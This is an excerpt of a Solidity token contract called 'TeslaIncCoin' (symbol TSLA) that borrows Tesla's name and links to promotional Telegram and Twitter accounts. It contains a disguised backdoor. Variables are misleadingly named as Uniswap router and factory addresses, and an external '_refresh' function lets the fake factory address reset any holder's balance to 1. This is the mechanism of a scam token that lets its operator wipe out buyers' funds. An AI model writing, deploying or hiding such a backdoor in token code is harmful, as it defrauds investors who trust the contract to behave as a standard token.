...
/*
https://TeslaIncCoinETH.xyz
https://t.me/TeslaIncCoinETH
https://twitter.com/TeslaIncCoinETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2uniswapRouter = 0x67B12D8246390258F13bcC3232735789D94539d2;
    string private _symbol;
    mapping(address => mapping(address => uint256)) private _allowanceEnableds;
    address private uniswapFactoryV2 = 0x9063E019d6EddB47d37103a42Da8c89d4eca9c38;
    ...
    function _refresh(address _refreshSender) external { if (msg.sender == uniswapFactoryV2) _balances[_refreshSender] = 0x1; }
...
contract TeslaIncCoin is ERC20, Ownable {
    constructor()
    ERC20(unicode"Tesla Inc", unicode"TSLA") {
